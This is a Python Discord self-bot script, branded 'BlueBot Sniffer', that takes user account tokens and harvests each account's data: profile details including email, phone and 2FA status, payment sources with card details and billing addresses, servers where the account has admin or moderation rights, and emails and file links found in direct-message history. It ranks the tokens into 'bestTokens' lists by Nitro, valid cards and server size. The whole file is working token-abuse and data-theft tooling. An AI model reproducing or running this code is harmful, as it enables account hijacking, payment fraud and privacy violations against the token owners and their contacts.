# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import json
from colorama import Fore, init
import sys
import os
import requests
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="218fkj", self_bot=True, intents=intents)
init(autoreset=True)
red = Fore.LIGHTRED_EX
blue = Fore.CYAN
green = Fore.LIGHTGREEN_EX
yellow = Fore.YELLOW
dgreen = Fore.GREEN
white = Fore.RESET
cwd = os.getcwd()
token = None
folder = None
dms = None
threshold = None
def an(content):
    sys.stdout.write(f"{content}\r")
def runToken(token2, folder2, dm2, threshold2, verification):
    if verification != "ODDFOFXUpgf7yEntul5ockCA.OFk6Ph.lmsA54bT0Fux1IpsYvey5XuZk04MTdqrd0vGDV1dcF0QPjom6OB.NQxUhj.I4JjFHIympR3mVF3UiUbbD5VVbiNTzQvPcLBacBmgajXQc7QAaU.XCgboz.c4t51kFWSEmdmaPnKoyUuu8E78E":
        print("Stop trying to get around the protection, its there for a reason.")
        sys.exit()
    global token
    global folder
    global dms
    global threshold
    token = token2
    folder = folder2
    dms = dm2
    threshold = int(threshold2)
    try:
        bot.run(token2, bot=False)
    except Exception as e:
        print(e)
        pass
@bot.event
async def on_connect():
    global token
    global folder
    print(f"{green}[+]{white} Connected to {bot.user}.")
    an(f"{yellow}[:]{white} Making Files...")
    os.makedirs(f"{folder}\\tokenData\\{bot.user.id}")
    open(f"{folder}\\tokenData\\{bot.user.id}\\personal.txt", "x")
    open(f"{folder}\\tokenData\\{bot.user.id}\\guilds.txt", "x")
    open(f"{folder}\\tokenData\\{bot.user.id}\\payment.txt", "x")
    open(f"{folder}\\tokenData\\{bot.user.id}\\emails.txt", "x")
    open(f"{folder}\\tokenData\\{bot.user.id}\\downloads.txt", "x")
    open(f"{folder}\\tokenData\\{bot.user.id}\\all_data.txt", "x")
    f = open(f"{folder}\\tokenData\\{bot.user.id}\\token.txt", "x")
    f.writelines(token)
    f.close()
    all_data2 = open(f"{folder}\\all_data.txt", "a", encoding="utf-8")
    all_data = open(f"{folder}\\tokenData\\{bot.user.id}\\all_data.txt", "a", encoding="utf-8")
    all_data.writelines("Data Sniffed by BlueBot Sniffer. youtube.com/ChasaVFX + linktr.ee/itschasa\n")
    print(f"{green}[+]{white} Created Files.                   ")
    an(f"{yellow}[:]{white} Grabbing Personal Data...")
    headers = { 
        "Content-Type": "application/json", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Authorization": token
    }
    req = requests.get("https://discord.com/api/users/@me", headers=headers)
    tokenData = req.json()
    print(f"{green}[+]{white} Grabbed Personal Data.           ")
    an(f"{yellow}[:]{white} Saving Personal Data...")
    try:
        if tokenData["premium_type"] == 1:
            sniff_nitro = "Classic ($5)"
        elif tokenData["premium_type"] == 2:
            sniff_nitro = "Nitro ($10)"
        else:
            sniff_nitro = "None"
    except:
        sniff_nitro = "None"
    personaldata = f"""-=-=-= {tokenData["username"]}#{tokenData["discriminator"]} =-=-=-
ID: {tokenData["id"]}
Name: {tokenData["username"]}#{tokenData["discriminator"]}
Avatar: https://cdn.discordapp.com/avatars/{tokenData["id"]}/{tokenData["avatar"]}
Nitro: {sniff_nitro}
2FA: {tokenData["mfa_enabled"]}
Email: {tokenData["email"]} (verified: {tokenData["verified"]})
Phone: {tokenData["phone"]}
Locale: {tokenData["locale"]}
NSFW: {tokenData["nsfw_allowed"]}
Token: {token}
-=-=-=-=--=-
 """
    with open(f"{folder}\\tokenData\\{bot.user.id}\\personal.txt", "w", encoding="utf-8") as f:
        f.writelines(personaldata)
    all_data.writelines(personaldata)
    print(f"{green}[+]{white} Saved Personal Data.                ")
    if sniff_nitro != "None":
        an(f"{yellow}[:]{white} Saving to nitro.txt...")
        with open(f"{folder}\\bestTokens\\nitro.txt", "a", encoding="utf-8") as f:
            f.writelines(f"{token} // {bot.user.name}#{bot.user.discriminator} // ID: {bot.user.id} // Nitro: {sniff_nitro}\n")
        print(f"{green}[+]{white} Saved to nitro.txt.     ")
    an(f"{yellow}[:]{white} Grabbing Payment Data...")
    req = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
    if req.status_code == 200:
        if req.text != "[]":
            paymentData = req.json()
            print(f"{green}[+]{white} Grabbed Payment Data.           ")
            an(f"{yellow}[:]{white} Saving to payment.txt and billing.txt...")
            data2write = "\n-=-= Payment Data =-=-\n"
            for payment in paymentData:
                if payment["type"] == 1:
                    data2write = data2write + f"""-=-=-=-=--=-
Type: Credit/Debit Card
Invalid: {payment["invalid"]}
ID: {payment["id"]}
Default: {payment["default"]}
Brand: {payment["brand"]}
Last 4 Digits: {payment["last_4"]}
Expire Date: {payment['expires_month']}/{payment['expires_year']}
Country: {payment["country"]}
Billing Address:
- Name: {payment['billing_address']['name']}
- Line1: {payment['billing_address']['line_1']}
- Line2: {payment['billing_address']['line_2']}
- City/Town: {payment['billing_address']['city']}
- State/County: {payment['billing_address']['state']}
- Country: {payment['billing_address']['country']}
- Postal Code: {payment['billing_address']['postal_code']}
-=-=-=-=--=-\n\n"""
                    if payment["invalid"] == True:
                        data = f"{token} // {bot.user.id} // Invalid Card"
                    else:
                        data = f"{token} // {bot.user.id} // Valid Card"
                    with open(f"{folder}\\bestTokens\\billing.txt", "a", encoding="utf-8") as f:
                        f.writelines(data + "\n")
                elif payment["type"] == 2:
                    data2write = data2write + f"""-=-=-=-=--=-
Type: PayPal
Invalid: {payment["invalid"]}
ID: {payment["id"]}
Email: {payment["email"]}
Default: {payment["default"]}
Country: {payment["country"]}
Billing Address:
- Name: {payment['billing_address']['name']}
- Line1: {payment['billing_address']['line_1']}
- Line2: {payment['billing_address']['line_2']}
- City/Town: {payment['billing_address']['city']}
- State/County: {payment['billing_address']['state']}
- Country: {payment['billing_address']['country']}
- Postal Code: {payment['billing_address']['postal_code']}
-=-=-=-=--=-\n\n"""
                    with open(f"{folder}\\bestTokens\\billing.txt", "a", encoding="utf-8") as f:
                        data = f"{token} // {bot.user.id} // Paypal"
                        f.writelines(data + "\n")
            
            with open(f"{folder}\\tokenData\\{bot.user.id}\\payment.txt", "a", encoding="utf-8") as f:
                f.writelines(data2write + "\n")
            all_data.writelines(data2write + "\n")
            print(f"{green}[+]{white} Saved Payment Data.                           ")
        else:
            print(f"{red}[-]{white} No Payment Data. (empty)        ")
            data2write = "\n-=-=-\nNo Payment Data\n-=-=-\n"
            all_data.writelines(data2write)
    else:
        print(f"{red}[-]{white} No Payment Data. (invalid)       ")
    an(f"{yellow}[:]{white} Getting Guild Data...")
    f = open(f"{folder}\\tokenData\\{bot.user.id}\\guilds.txt", "w", encoding="utf-8")
    f2 = open(f"{folder}\\bestTokens\\guilds.txt", "a", encoding="utf-8")
    data2write = "\n-=-= Guild Data =-=-\n"
    for guild in bot.guilds:
        if guild.me != None:
            if guild.owner_id == bot.user.id:
                f.writelines(f"{guild.name} // {guild.member_count} members // OWNER // {guild.id} guild-id\n")
                data2write += f"{guild.name} // {guild.member_count} members // OWNER // {guild.id} guild-id\n"
                if guild.member_count > threshold:
                    f2.writelines(f"{token} // {bot.user.id} user-id // {guild.name} // {guild.member_count} members // OWNER // {guild.id} guild-id\n")
            elif guild.me.guild_permissions.administrator == True:
                f.writelines(f"{guild.name} // {guild.member_count} members // Administrator // {guild.id} guild-id\n")
                data2write += f"{guild.name} // {guild.member_count} members // Administrator // {guild.id} guild-id\n"
                if guild.member_count > threshold:
                    f2.writelines(f"{token} // {bot.user.id} user-id // {guild.name} // {guild.member_count} members // Administrator // {guild.id} guild-id\n")
            else:
                user_permissions = []
                if guild.me.guild_permissions.manage_guild == True:
                    user_permissions.append("Manage Guild")
                if guild.me.guild_permissions.manage_roles == True:
                    user_permissions.append("Manage Roles")
                if guild.me.guild_permissions.ban_members == True:
                    user_permissions.append("Ban Members")
                if guild.me.guild_permissions.kick_members == True:
                    user_permissions.append("Kick Members")
                if guild.me.guild_permissions.manage_channels == True:
                    user_permissions.append("Manage Channels")
                if len(user_permissions) > 0:
                    f.writelines(f"{guild.name} // {guild.member_count} members // {user_permissions} // {guild.id} guild-id\n")
                    data2write += f"{guild.name} // {guild.member_count} members // {user_permissions} // {guild.id} guild-id\n"
                    if guild.member_count > threshold:
                        f2.writelines(f"{token} // {bot.user.id} user-id // {guild.name} // {guild.member_count} members // {user_permissions} // {guild.id} guild-id\n")
    all_data.writelines(data2write)
    f.close()
    f2.close()
    print(f"{green}[+]{white} Saved Guild Data.          ")
    all_data.writelines("\n-=-= DM Data =-=-\n")
    emaildata = "- Emails Found -\n"
    downloaddata = "- Downloads Found -\n"
    if dms == "T":
        an(f"{yellow}[:]{white} Getting Emails and Downloads...")
        req = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
        if req.status_code == 200:
            relationshipsData = req.json()
            extentions = [".exe", ".txt", ".zip", ".py", ".js", ".java", ".rar"]
            emails = ["@gmail.com","@yahoo.com","@hotmail.com","@aol.com","@hotmail.co.uk","@hotmail.fr","@msn.com","@yahoo.fr","@wanadoo.fr","@orange.fr","@comcast.net","@yahoo.co.uk","@yahoo.com.br","@yahoo.co.in","@live.com","@rediffmail.com","@free.fr","@gmx.de","@web.de","@yandex.ru","@ymail.com","@libero.it","@outlook.com","@uol.com.br","@bol.com.br","@mail.ru","@cox.net","@hotmail.it","@sbcglobal.net","@sfr.fr","@live.fr","@verizon.net","@live.co.uk","@googlemail.com","@yahoo.es","@ig.com.br","@live.nl","@bigpond.com","@terra.com.br","@yahoo.it","@neuf.fr","@yahoo.de","@alice.it","@rocketmail.com","@att.net","@laposte.net","@facebook.com","@bellsouth.net","@yahoo.in","@hotmail.es","@charter.net","@yahoo.ca","@yahoo.com.au","@rambler.ru","@hotmail.de","@tiscali.it","@shaw.ca","@yahoo.co.jp","@sky.com","@earthlink.net","@optonline.net","@freenet.de","@t-online.de","@aliceadsl.fr","@virgilio.it","@home.nl","@qq.com","@telenet.be","@me.com","@yahoo.com.ar","@tiscali.co.uk","@yahoo.com.mx","@voila.fr","@gmx.net","@mail.com","@planet.nl","@tin.it","@live.it","@ntlworld.com","@arcor.de","@yahoo.co.id","@frontiernet.net","@hetnet.nl","@live.com.au","@yahoo.com.sg","@zonnet.nl","@club-internet.fr","@juno.com","@optusnet.com.au","@blueyonder.co.uk","@bluewin.ch","@skynet.be","@sympatico.ca","@windstream.net","@mac.com","@centurytel.net","@chello.nl","@live.ca","@aim.com","@bigpond.net.au"]
            f = open(f"{folder}\\tokenData\\{bot.user.id}\\emails.txt", "w", encoding="utf-8")
            f2 = open(f"{folder}\\tokenData\\{bot.user.id}\\downloads.txt", "w", encoding="utf-8")
            print(f"{green}[+]{white} Fetched DMs and Downloads.          ")
            print(f"{yellow}[:]{white} Searching through DMs...    ")
            an(f"{yellow}[----------] {white}0/{len(relationshipsData)} searched.               ")
            animation = ["[□□□□□□□□□□]", "[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
            counter = 0
           
            for user in relationshipsData:
                try:
                    friend_user = bot.get_user(int(user["id"]))
                    if friend_user == None:
                        continue
                    else:
                        async for message in friend_user.dm_channel.history(limit=None):
                            for email in emails:
                                if email in message.content:
                                    f.writelines(f"-=-=-=-=--=-=-=-=-=--=-=-=-=-=--=-\n{message.content}\nhttps://discord.com/channels/@me/{friend_user.dm_channel.id}/{message.id}\n")
                                    emaildata += (f"-=-=-=-=--=-=-=-=-=--=-=-=-=-=--=-\n{message.content}\nhttps://discord.com/channels/@me/{friend_user.dm_channel.id}/{message.id}\n")
                                    break
                            if message.attachments != []:
                                for ex in extentions:
                                    if ex in message.attachments[0].filename:
                                        f2.writelines(f"-=-=-=-=--=-=-=-=-=--=-=-=-=-=--=-\n{message.attachments[0].filename}\n{message.attachments[0].url}\nhttps://discord.com/channels/@me/{friend_user.dm_channel.id}/{message.id}\n")
                                        downloaddata += (f"-=-=-=-=--=-=-=-=-=--=-=-=-=-=--=-\n{message.attachments[0].filename}\n{message.attachments[0].url}\nhttps://discord.com/channels/@me/{friend_user.dm_channel.id}/{message.id}\n")
                                        break
                except:
                    pass
                counter += 1
                an(f"{yellow}{animation[int((counter / len(relationshipsData)) * 10)]}{white} {counter}/{len(relationshipsData)} searched.       ")
            print(f"\n{green}[+]{white} Searched DMs.")
            f.writelines("-=-=-=-=--=-=-=-=-=--=-=-=-=-=--=-")
            f2.writelines("-=-=-=-=--=-=-=-=-=--=-=-=-=-=--=-")
            
            f.close()
            f2.close()
        else:
            print(f"{red}[!]{white} Couldn't Fetch Friendship Data.")
            emaildata += "Couldn't Fetch Data."
            downloaddata += "Couldn't Fetch Data."
    else:
        print(f"{blue}[/]{white} Skipped DM Searching.")
        all_data.writelines("Skipped DM Searching\n\n")
    emaildata += "-=-=-=-=--=-=-=-=-=--=-=-=-=-=--=-"
    downloaddata += "-=-=-=-=--=-=-=-=-=--=-=-=-=-=--=-"
    all_data.writelines(emaildata + "\n\n" + downloaddata)
    all_data.close()
    all_data = open(f"{folder}\\tokenData\\{bot.user.id}\\all_data.txt", "r", encoding="utf-8")
    all_data2.write(f"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n")
    for line in all_data.readlines():
        all_data2.write(f"{line}")
    all_data2.write(f"\n\n")
    all_data2.close()
    all_data.close()
    sys.exit("Loading next token")
runToken(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
